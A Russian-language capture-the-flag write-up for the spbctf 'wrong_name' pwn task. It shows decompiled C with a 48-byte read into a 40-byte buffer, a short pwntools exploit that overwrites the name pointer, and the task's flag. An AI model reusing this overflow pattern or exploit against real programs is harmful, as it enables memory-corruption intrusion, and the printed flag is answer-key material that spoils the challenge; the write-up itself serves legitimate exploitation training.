[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_wrong_name)
Описание:
Угадай имя или, если ты ленивый, сделай что-нибудь другое...
`nc 109.233.56.90 11632`
**[wrong_name.elf](https://pwn.spbctf.ru/files/aslr/wrong_name/wrong_name.elf)**

Необходимо переполнить буфер `user_input` и перезаписать указатель на нужный мне.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t len; // rax
  char user_input[40]; // [rsp+0h] [rbp-30h] BYREF
  char *s; // [rsp+28h] [rbp-8h]

  s = (char *)rand_name(argc, argv, envp);

  printf("What's your name: ");
  read_n(user_input, 48);

  len = strlen(s);
  if ( !strncmp(user_input, s, len) )
  {
    printf("Glad to see you, %s!\n", s);
    print_flag();
  }
  else
  {
    puts("Go away!");
  }
  return 0;
}
```

Генерация имён:
``` C
char *rand_name()
{
  unsigned int v0; // eax

  v0 = time(nullptr);
  srand(v0);
  return (&NAMES)[(int)rand_int(0, 20)];
}
```

```
.data:00000000004040C0 NAMES           dq offset aJoseph       ; DATA XREF: rand_name+30↑o
.data:00000000004040C0                                         ; "Joseph"
.data:00000000004040C8                 dq offset aJessica      ; "Jessica"
.data:00000000004040D0                 dq offset aThomas       ; "Thomas"
.data:00000000004040D8                 dq offset aSarah        ; "Sarah"
.data:00000000004040E0                 dq offset aCharles      ; "Charles"
.data:00000000004040E8                 dq offset aKaren        ; "Karen"
.data:00000000004040F0                 dq offset aChristopher  ; "Christopher"
.data:00000000004040F8                 dq offset aNancy        ; "Nancy"
.data:0000000000404100                 dq offset aDaniel       ; "Daniel"
.data:0000000000404108                 dq offset aLisa         ; "Lisa"
.data:0000000000404110                 dq offset aMatthew      ; "Matthew"
.data:0000000000404118                 dq offset aMargaret     ; "Margaret"
.data:0000000000404120                 dq offset aTom          ; "Tom"
.data:0000000000404128                 dq offset aBetty        ; "Betty"
.data:0000000000404130                 dq offset aDonald       ; "Donald"
.data:0000000000404138                 dq offset aSandra       ; "Sandra"
.data:0000000000404140                 dq offset aMark         ; "Mark"
.data:0000000000404148                 dq offset aAshley       ; "Ashley"
.data:0000000000404150                 dq offset aPaul         ; "Paul"
.data:0000000000404158                 dq offset aJerry        ; "Jerry"
.data:0000000000404158 _data           ends
```
Например, возьму Jerry:

Эксплоит:
``` python
io = start()

payload = b'Jerry'.ljust(40, b'\x00') + p64(0x40208E)
io.sendlineafter(b'name: ', payload)

io.interactive()
```

Запуск:
![{EBAB9B0C-A684-46D8-BF75-F9A3BE020E23}](../../../../z.%20Images/{EBAB9B0C-A684-46D8-BF75-F9A3BE020E23}.png)

Ответ: `spbctf{ca2035ab440f221f8e94bf5461655f13}`